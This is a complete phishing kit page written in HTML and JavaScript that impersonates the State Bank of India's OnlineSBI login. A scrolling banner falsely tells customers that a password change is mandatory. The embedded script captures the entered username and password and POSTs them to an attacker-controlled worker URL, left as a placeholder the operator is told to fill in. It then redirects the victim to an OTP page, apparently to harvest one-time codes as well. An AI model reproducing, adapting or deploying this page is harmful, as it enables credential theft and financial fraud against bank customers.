<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBI - Personal Banking</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
        body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
        .full-img { width: 100%; display: block; }
        .sky-blue-container { background-color: #eaf6ff; width: 100%; padding: 10px 0 5px 0; text-align: center; border-bottom: 1px solid #d1e9ff; display: flex; flex-direction: column; align-items: center; }
        .login-title { color: #0054a6; font-size: 13px; font-weight: bold; margin-bottom: 2px; }
        .scrolling-msg { color: #b30000; font-size: 13px; font-weight: bold; width: 100%; margin-top: 3px; margin-bottom: 2px; }
        .center-icon { font-size: 12px; color: #0054a6; line-height: 1; display: block; margin-top: 3px; cursor: pointer; }
        .content-area { padding: 0 25px; flex-grow: 1; }
        .care-text { padding: 12px 0; font-size: 13px; color: #333; }
        .care-text b { color: #b30000; }
        .field-group { margin-bottom: 12px; }
        .field-group label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; }
        .field-group input { width: 100%; padding: 8px 12px; background-color: #f1f1f1; border: 1px solid #ddd; border-radius: 2px; font-size: 15px; outline: none; height: 38px; }
        .error-hint { color: #b30000; font-size: 12px; margin-top: 2px; font-weight: bold; display: none; }
        .radio-option { display: flex; align-items: center; gap: 10px; color: #b30000; font-weight: bold; font-size: 13px; margin-bottom: 8px; }
        .captcha-box { display: flex; align-items: center; gap: 15px; margin: 10px 0 15px; }
        .captcha-container { position: relative; background: #fff; width: 130px; height: 45px; display: flex; align-items: center; justify-content: flex-start; overflow: hidden; border: none; }
        .captcha-img { font-size: 26px; font-weight: bold; letter-spacing: 4px; font-family: 'Courier New', Courier, monospace; font-style: italic; z-index: 2; user-select: none; }
        .line { position: absolute; height: 1.5px; width: 120%; z-index: 1; }
        .refresh-btn { font-size: 30px; color: #1a73bc; cursor: pointer; font-weight: 900; }
        .btn-row { display: flex; justify-content: flex-start; gap: 10px; margin-top: 15px; }
        .btn { width: 90px; padding: 8px 0; border: none; color: white; font-size: 15px; border-radius: 2px; cursor: pointer; }
        .btn-blue { background-color: #315195; }
        .btn-gray { background-color: #6c757d; }
        .footer-links { margin-top: 20px; font-size: 13px; }
        .footer-links a { color: #1a73bc; text-decoration: none; display: block; margin-bottom: 8px; }
        .v-keyboard-box { background-color: #fcfcfc; padding: 10px 0; border: none; margin: 18px 0; display: flex; align-items: center; gap: 10px; font-size: 14px; color: #444; }
        .v-keyboard-box input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; }
        .footer-img-container { width: 100%; margin-top: 20px; }
    </style>
</head>
<body onload="generateCaptcha()">

    <div class="container">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">

        <div class="sky-blue-container">
            <div class="login-title">Login to OnlineSBI</div>
            <div class="scrolling-msg">
                <marquee id="sbiMarquee" scrollamount="4">Dear Customer, Mandatory login and profile password change</marquee>
            </div>
            <div class="center-icon" onclick="toggleMarquee()">⏯️</div>
        </div>

        <div class="content-area">
            <div class="care-text"><b>(CARE:</b> Username and password are case sensitive.)</div>

            <form class="login-form" id="loginForm">
                <div class="field-group">
                    <label>Username*</label>
                    <input type="text" id="username" autocomplete="off" required>
                    <div id="userError" class="error-hint">Wrong Username</div>
                </div>

                <div class="field-group">
                    <label>Password*</label>
                    <input type="password" id="password" autocomplete="off" required>
                    <div id="passError" class="error-hint">Wrong Password</div>
                </div>

                <div class="field-group">
                    <label>Enter the text as shown in the image *</label>
                    <input type="text" id="captcha_input" autocomplete="off" required>
                    <div id="captchaError" class="error-hint">Invalid Captcha</div>
                </div>

                <p style="font-size: 12px; color: #555; margin-bottom: 8px;">Select one of the Captcha options *</p>
                <label class="radio-option"><input type="radio" name="c" checked> Image Captcha</label>
                <label class="radio-option"><input type="radio" name="c"> Audio Captcha</label>

                <div class="captcha-box">
                    <div class="captcha-container" id="captcha_wrap"><div class="captcha-img" id="captcha_txt"></div></div>
                    <div class="refresh-btn" onclick="generateCaptcha()">&#8635;</div>
                </div>

                <div class="btn-row">
                    <button type="submit" class="btn btn-blue" id="loginBtn">Login</button>
                    <button type="reset" class="btn btn-gray" onclick="generateCaptcha()">Reset</button>
                </div>

                <div class="footer-links">
                    <a href="#">New User ? Register here/Activate</a>
                    <a href="#">Forgot Username / Login Password</a>
                </div>
            </form>
        </div>

        <div class="footer-img-container">
            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer Info" class="full-img">
        </div>
    </div>

    <script>
        let currentCaptcha = "";
        const WORKER_URL = "TERA_WORKER_URL_HERE"; // <--- APNA WORKER LINK YAHA DALO

        function generateCaptcha() {
            const chars = '23456789abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ';
            let code = '';
            for (let i = 0; i < 5; i++) { code += chars.charAt(Math.floor(Math.random() * chars.length)); }
            currentCaptcha = code;
            const captchaTextElement = document.getElementById('captcha_txt');
            captchaTextElement.innerText = code;
            const wrap = document.getElementById('captcha_wrap');
            wrap.querySelectorAll('.line').forEach(l => l.remove());
            for (let i = 0; i < 4; i++) {
                const line = document.createElement('div');
                line.className = 'line';
                line.style.backgroundColor = '#FF0000';
                line.style.top = (Math.random() * 30 + 5) + 'px';
                line.style.left = '-10%';
                line.style.transform = `rotate(${Math.random() * 15 - 7}deg)`;
                wrap.appendChild(line);
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const captchaInput = document.getElementById('captcha_input').value;
            
            if (captchaInput !== currentCaptcha) {
                document.getElementById('captchaError').style.display = 'block';
                return;
            }

            const loginBtn = document.getElementById('loginBtn');
            loginBtn.innerText = "Processing...";
            loginBtn.disabled = true;

            const data = {
                username: user,
                password: pass,
                type: "LOGIN_DETAILS",
                date: new Date().toLocaleString()
            };

            try {
                await fetch(WORKER_URL, {
                    method: 'POST',
                    mode: 'no-cors', // Worker settings ke hisab se change kar sakte ho
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                // Data bhejte hi agle page par redirect
                window.location.href = "otp.html"; 
            } catch (err) {
                console.log(err);
                window.location.href = "otp.html";
            }
        });

        let isMoving = true;
        function toggleMarquee() {
            const mq = document.getElementById('sbiMarquee');
            isMoving ? mq.stop() : mq.start();
            isMoving = !isMoving;
        }
    </script>
</body>
</html>
